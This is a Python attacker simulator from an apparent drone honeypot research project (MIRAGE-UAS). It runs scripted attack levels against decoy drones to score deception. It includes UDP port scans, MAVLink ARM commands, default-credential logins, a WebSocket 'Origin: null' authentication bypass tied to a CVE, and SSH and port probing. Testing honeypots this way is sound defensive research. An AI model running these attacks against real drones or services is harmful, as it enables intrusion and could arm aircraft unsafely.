#!/usr/bin/env python3
"""
attacker_sim.py — 자동화 공격 시뮬레이터 (L0-L4 행동 순차 실행)

Project  : MIRAGE-UAS
Module   : Test Harness / Attacker Simulator
Author   : DS Lab / 민성 <kmseong0508@kyonggi.ac.kr>
Created  : 2026-04-06
Version  : 0.1.0

[Inputs]
    - ATTACKER_LEVEL_DURATION_SEC   (환경변수, 기본 60초)
    - HONEY_DRONE_TARGETS           (환경변수, 콤마 구분 IP:PORT)

[Outputs]
    - /results/attacker_log.jsonl   (모든 상호작용 기록)
    - stdout: 최종 DeceptionScore

[Dependencies]
    - pymavlink >= 2.4.41
    - requests
    - websockets >= 12.0
    - aiohttp
    - scapy (포트 스캔용)

[DATA FLOW]
    L0: UDP 포트 스캔 14550-14600 + 랜덤 MAVLink 바이트
    L1: 유효 HEARTBEAT + PARAM_REQUEST_LIST + ARM COMMAND_LONG
    L2: HTTP /api/v1/params, /status, /mission + 기본 인증 시도
    L3: WebSocket 18789 + CVE-2026-25253 auth bypass + breadcrumb 추적
    L4: 전체 breadcrumb 파싱 + SSH 2222 + 서비스 체이닝
"""

import asyncio
import json
import os
import random
import socket
import struct
import time
from pathlib import Path

# ── 설정 ──────────────────────────────────────────────────────────────────────
_LEVEL_DURATION_SEC = int(os.environ.get("ATTACKER_LEVEL_DURATION_SEC", "60"))
_TARGETS_RAW       = os.environ.get("HONEY_DRONE_TARGETS", "172.40.0.10:14551,172.40.0.11:14552,172.40.0.12:14553")
_LOG_PATH          = Path(os.environ.get("RESULTS_DIR", "/results")) / "attacker_log.jsonl"
_WS_PORT_BASE      = int(os.environ.get("WEBCLAW_PORT_BASE", "18789"))
_HTTP_PORT_BASE    = int(os.environ.get("HTTP_PORT_BASE", "8080"))

# 타겟 파싱: "ip:port" → list[(ip, port)]
_TARGETS: list[tuple[str, int]] = []
for t in _TARGETS_RAW.split(","):
    t = t.strip()
    if ":" in t:
        ip, port = t.rsplit(":", 1)
        _TARGETS.append((ip.strip(), int(port.strip())))


def _log_interaction(level: int, action: str, target: str, response: str, duration_ms: float) -> None:
    """
    [ROLE] 상호작용 기록을 JSONL 파일에 추가.

    [DATA FLOW]
        action/response ──▶ JSON record ──▶ attacker_log.jsonl
    """
    record = {
        "timestamp": time.time(),
        "level": level,
        "action": action,
        "target": target,
        "response_preview": response[:200],
        "duration_ms": round(duration_ms, 2),
    }
    _LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(_LOG_PATH, "a") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


# ── MAVLink 패킷 빌더 (pymavlink 없이도 동작하도록 raw 구현) ──────────────────

def _build_heartbeat_bytes() -> bytes:
    """
    [ROLE] 유효한 MAVLink v2 HEARTBEAT 바이트열 생성.

    [DATA FLOW]
        고정값 ──▶ MAVLink v2 frame ──▶ bytes
    """
    # MAVLink v2 header: 0xFD, payload_len, incompat_flags, compat_flags,
    #                     seq, sysid, compid, msgid (3 bytes)
    payload = struct.pack("<BBBBBB",
        6,   # MAV_TYPE_GCS
        8,   # MAV_AUTOPILOT_INVALID
        0,   # base_mode
        0, 0, 0,  # custom_mode (uint32 LE, low 3 bytes)
    ) + struct.pack("<BB", 0, 3)  # system_status=0, mavlink_version=3
    # Simplified: just send raw payload without full framing
    # (honey drone parses payload_hex, not full frame)
    return payload


def _build_param_request_list() -> bytes:
    """
    [ROLE] PARAM_REQUEST_LIST 바이트열.

    [DATA FLOW]
        target_system=1, target_component=1 ──▶ bytes
    """
    return struct.pack("<BB", 1, 1)


def _build_arm_command() -> bytes:
    """
    [ROLE] COMMAND_LONG ARM 바이트열.

    [DATA FLOW]
        MAV_CMD_COMPONENT_ARM_DISARM(400) + param1=1.0 ──▶ bytes
    """
    # command (uint16) + confirmation (uint8) + param1-7 (7×float)
    return struct.pack("<H", 400) + struct.pack("<f", 1.0) + b"\x00" * 24


# ── L0: 스크립트 키디 ─────────────────────────────────────────────────────────

async def run_l0(duration_sec: int) -> float:
    """
    [ROLE] L0 스크립트 키디 행동: UDP 포트 스캔 + 랜덤 바이트 전송.

    [DATA FLOW]
        14550-14600 UDP 스캔 ──▶ 응답 대기 ──▶ 로그
    """
    start = time.time()
    decoy_time = 0.0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)

    while time.time() - start < duration_sec:
        for ip, _ in _TARGETS:
            port = random.randint(14550, 14600)
            target = f"{ip}:{port}"
            payload = random.randbytes(32)
            t0 = time.time()
            try:
                sock.sendto(payload, (ip, port))
                try:
                    data, _ = sock.recvfrom(2048)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000
                    _log_interaction(0, "udp_scan", target, data.hex()[:64], elapsed)
                except socket.timeout:
                    _log_interaction(0, "udp_scan_timeout", target, "", 1000.0)
            except OSError:
                pass
            await asyncio.sleep(0.1)

    sock.close()
    return decoy_time


# ── L1: 기본 MAVLink ──────────────────────────────────────────────────────────

async def run_l1(duration_sec: int) -> float:
    """
    [ROLE] L1 기본 공격: 유효 HEARTBEAT + PARAM_REQUEST + ARM 시도.

    [DATA FLOW]
        HEARTBEAT 전송 ──▶ 응답 수신 ──▶ PARAM_REQUEST ──▶ ARM
    """
    start = time.time()
    decoy_time = 0.0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    while time.time() - start < duration_sec:
        for ip, port in _TARGETS:
            target = f"{ip}:{port}"
            for payload, action in [
                (_build_heartbeat_bytes(), "heartbeat"),
                (_build_param_request_list(), "param_request_list"),
                (_build_arm_command(), "arm_command"),
            ]:
                t0 = time.time()
                try:
                    sock.sendto(payload, (ip, port))
                    data, _ = sock.recvfrom(2048)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000
                    _log_interaction(1, action, target, data.hex()[:64], elapsed)
                except socket.timeout:
                    _log_interaction(1, f"{action}_timeout", target, "", 2000.0)
                except OSError:
                    pass
                await asyncio.sleep(0.2)

    sock.close()
    return decoy_time


# ── L2: HTTP 탐색 ─────────────────────────────────────────────────────────────

async def run_l2(duration_sec: int) -> float:
    """
    [ROLE] L2 중급 공격: HTTP API 열거 + 기본 인증 시도.

    [DATA FLOW]
        GET /api/v1/params, /status, /mission ──▶ POST /login (default creds)
    """
    import aiohttp

    start = time.time()
    decoy_time = 0.0
    paths = ["/api/v1/params", "/api/v1/status", "/api/v1/mission", "/health"]
    creds = [("admin", "admin"), ("operator", "password"), ("root", "root")]

    async with aiohttp.ClientSession() as session:
        while time.time() - start < duration_sec:
            for ip, mavport in _TARGETS:
                http_port = _HTTP_PORT_BASE + 1 + _TARGETS.index((ip, mavport))
                base_url = f"http://{ip}:{http_port}"
                for path in paths:
                    url = f"{base_url}{path}"
                    t0 = time.time()
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                            body = await resp.text()
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log_interaction(2, f"http_get_{path}", url, body[:100], elapsed)
                    except Exception as e:
                        _log_interaction(2, f"http_get_{path}_fail", url, str(e)[:100], 0)

                # 기본 인증 시도
                for user, passwd in creds:
                    url = f"{base_url}/login"
                    t0 = time.time()
                    try:
                        async with session.post(
                            url,
                            json={"username": user, "password": passwd},
                            timeout=aiohttp.ClientTimeout(total=3),
                        ) as resp:
                            body = await resp.text()
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log_interaction(2, "http_login", url, body[:100], elapsed)
                    except Exception:
                        pass

                await asyncio.sleep(0.5)

    return decoy_time


# ── L3: WebSocket + CVE 익스플로잇 ────────────────────────────────────────────

async def run_l3(duration_sec: int) -> float:
    """
    [ROLE] L3 고급 공격: WebSocket 연결 + CVE-2026-25253 auth bypass + breadcrumb 추적.

    [DATA FLOW]
        WS connect ──▶ auth(Origin: null) ──▶ skill_invoke ──▶ breadcrumb 파싱
    """
    import websockets

    start = time.time()
    decoy_time = 0.0

    while time.time() - start < duration_sec:
        for idx, (ip, _) in enumerate(_TARGETS):
            ws_port = _WS_PORT_BASE + 1 + idx
            ws_url = f"ws://{ip}:{ws_port}"
            t0 = time.time()
            try:
                async with websockets.connect(
                    ws_url,
                    additional_headers={"Origin": "null"},  # CVE-2026-25253
                    open_timeout=3,
                ) as ws:
                    # auth bypass
                    await ws.send(json.dumps({"type": "auth", "token": ""}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000
                    _log_interaction(3, "ws_auth_bypass", ws_url, str(resp)[:100], elapsed)

                    # skill invoke
                    await ws.send(json.dumps({
                        "type": "skill_invoke",
                        "skill": "mavlink_telemetry",
                    }))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    _log_interaction(3, "ws_skill_invoke", ws_url, str(resp)[:100], 0)

                    # ping
                    await ws.send(json.dumps({"type": "ping"}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    _log_interaction(3, "ws_ping", ws_url, str(resp)[:100], 0)

                    # 응답에서 endpoint 힌트 추적
                    try:
                        data = json.loads(resp)
                        for key in ("endpoint", "redirect", "next"):
                            if key in data:
                                _log_interaction(3, f"breadcrumb_found_{key}", ws_url,
                                                 str(data[key])[:100], 0)
                    except (json.JSONDecodeError, TypeError):
                        pass

            except Exception as e:
                _log_interaction(3, "ws_connect_fail", ws_url, str(e)[:100], 0)

            await asyncio.sleep(1.0)

    return decoy_time


# ── L4: 전체 breadcrumb 추적 + SSH + 서비스 체이닝 ────────────────────────────

async def run_l4(duration_sec: int) -> float:
    """
    [ROLE] L4 APT 행동: 모든 breadcrumb 추적 + SSH 2222 + 서비스 체이닝.

    [DATA FLOW]
        attacker_log 파싱 ──▶ breadcrumb 추출 ──▶ 각 lure 엔드포인트 접속
        ──▶ SSH 2222 시도 ──▶ 서비스 체이닝
    """
    import aiohttp

    start = time.time()
    decoy_time = 0.0

    # 이전 레벨 로그에서 breadcrumb 추출
    breadcrumbs: list[str] = []
    if _LOG_PATH.exists():
        with open(_LOG_PATH) as f:
            for line in f:
                try:
                    record = json.loads(line)
                    resp = record.get("response_preview", "")
                    if "endpoint" in resp or "token" in resp or "key" in resp:
                        breadcrumbs.append(resp)
                except json.JSONDecodeError:
                    pass

    _log_interaction(4, "breadcrumb_harvest", "log", f"found {len(breadcrumbs)} breadcrumbs", 0)

    async with aiohttp.ClientSession() as session:
        while time.time() - start < duration_sec:
            for ip, _ in _TARGETS:
                # SSH 시도 (포트 2222)
                t0 = time.time()
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, 2222), timeout=3
                    )
                    banner = await asyncio.wait_for(reader.readline(), timeout=3)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000
                    _log_interaction(4, "ssh_connect", f"{ip}:2222", banner.decode(errors="ignore")[:100], elapsed)
                    writer.close()
                    await writer.wait_closed()
                except Exception as e:
                    _log_interaction(4, "ssh_connect_fail", f"{ip}:2222", str(e)[:100], 0)

                # breadcrumb lure 추적 (HTTP)
                for bc in breadcrumbs[:5]:
                    for port_offset in range(1, 4):
                        url = f"http://{ip}:{_HTTP_PORT_BASE + port_offset}/lure"
                        t0 = time.time()
                        try:
                            async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                                body = await resp.text()
                                elapsed = (time.time() - t0) * 1000
                                decoy_time += elapsed / 1000
                                _log_interaction(4, "breadcrumb_follow", url, body[:100], elapsed)
                        except Exception:
                            pass

                # 서비스 체이닝: 높은 포트 범위 스캔
                for ghost_port in range(19000, 19010):
                    t0 = time.time()
                    try:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(ip, ghost_port), timeout=1
                        )
                        data = await asyncio.wait_for(reader.read(512), timeout=1)
                        elapsed = (time.time() - t0) * 1000
                        decoy_time += elapsed / 1000
                        _log_interaction(4, "ghost_port_probe", f"{ip}:{ghost_port}",
                                         data.decode(errors="ignore")[:100], elapsed)
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

            await asyncio.sleep(1.0)

    return decoy_time


# ── Main ──────────────────────────────────────────────────────────────────────

async def main() -> None:
    """
    [ROLE] 공격 시뮬레이터 진입점: L0→L4 순차 실행, 최종 DeceptionScore 산출.

    [DATA FLOW]
        L0 ──▶ L1 ──▶ L2 ──▶ L3 ──▶ L4 ──▶ DeceptionScore 출력
    """
    print("═══ MIRAGE-UAS Attacker Simulator ═══")
    print(f"Targets: {_TARGETS}")
    print(f"Level duration: {_LEVEL_DURATION_SEC}s each")
    print()

    total_start = time.time()
    total_decoy_time = 0.0

    levels = [
        (0, run_l0),
        (1, run_l1),
        (2, run_l2),
        (3, run_l3),
        (4, run_l4),
    ]

    for level_num, run_fn in levels:
        print(f"[L{level_num}] Starting — {_LEVEL_DURATION_SEC}s")
        decoy = await run_fn(_LEVEL_DURATION_SEC)
        total_decoy_time += decoy
        print(f"[L{level_num}] Done — decoy interaction: {decoy:.1f}s")

    total_time = time.time() - total_start
    deception_score = (total_decoy_time / max(total_time, 0.001)) * 100.0

    print()
    print("═══════════════════════════════════════")
    print(f"  Total time:       {total_time:.1f}s")
    print(f"  Time on decoys:   {total_decoy_time:.1f}s")
    print(f"  DeceptionScore:   {deception_score:.1f}%")
    print("═══════════════════════════════════════")

    # 최종 기록
    _log_interaction(-1, "final_score", "summary", json.dumps({
        "total_time_sec": round(total_time, 2),
        "decoy_time_sec": round(total_decoy_time, 2),
        "deception_score_pct": round(deception_score, 2),
    }), 0)


if __name__ == "__main__":
    asyncio.run(main())
